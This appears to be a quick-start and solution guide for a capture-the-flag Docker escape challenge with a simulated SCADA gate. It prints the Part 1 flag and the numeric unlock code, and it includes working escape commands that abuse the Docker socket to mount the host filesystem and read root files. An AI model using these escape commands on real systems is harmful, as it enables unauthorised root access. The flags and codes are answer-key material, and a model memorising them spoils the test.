# Quick Start Guide - Part 2: Docker Escape Challenge

## Challenge Context

This is **Part 2** of the Asylum challenge. Players start with shell access as `svc_vidops` user from Part 1. You need to:
1. Access the privileged Docker container
2. Perform Docker escape to get the numeric unlock code
3. Authenticate to SCADA terminal with Part 1 flag
4. Unlock the gate with the numeric code

## One-Command Setup

```bash
./setup.sh
```

This will:
1. Build the Docker image (unlock code is created inside container)
2. Start the privileged container
3. Provide connection instructions

## Manual Setup

### 1. Create Unlock Code File
```bash
# Unlock code is created inside the container during build at /root/.asylum/unlock_code
```

### 2. Build and Run
```bash
docker compose up -d --build
```

### 3. Connect to SCADA Terminal
```bash
nc localhost 9001
```

**Authentication Required:**
- When prompted, enter Part 1 flag: `THM{Y0u_h4ve_b3en_j3stered_739138}`
- Only after authentication will you have access to SCADA commands

### 4. Access Container Shell (for escape)
```bash
docker exec -it asylum_gate_control /bin/bash
```

## Challenge Flow

1. **You already have shell as `svc_vidops` (from Part 1)**
2. **Access container:** `docker exec -it asylum_gate_control /bin/bash`
3. **Perform Docker escape to get unlock code:**
   - `sudo docker -H unix:///var/run/docker.sock exec -u root asylum_gate_control cat /root/.asylum/unlock_code`
   - Output: `739184627`
4. **Connect to SCADA terminal:** `nc localhost 9001`
5. **Authenticate:** Enter Part 1 flag: `THM{Y0u_h4ve_b3en_j3stered_739138}`
6. **Unlock the gate:** Use `unlock 739184627`

## Useful Commands Inside Container

```bash
# Check mounts
mount | grep host

# Check Docker socket
ls -la /var/run/docker.sock

# Check capabilities
cat /proc/self/status | grep CapEff

# Use sudo to access root directory
sudo cat /root/.asylum/unlock_code

# Use Docker socket to escape
docker -H unix:///var/run/docker.sock run -it --rm -v /:/host ubuntu chroot /host bash
```

## Verification

After setup, verify everything works:
```bash
# Check container is running
docker ps | grep asylum_gate_control

# Test SCADA connection (with authentication)
nc localhost 9001 << EOF
THM{Y0u_h4ve_b3en_j3stered_739138}
help
status
exit
EOF

# Verify unlock code exists in container
docker exec asylum_gate_control sudo cat /root/.asylum/unlock_code
```
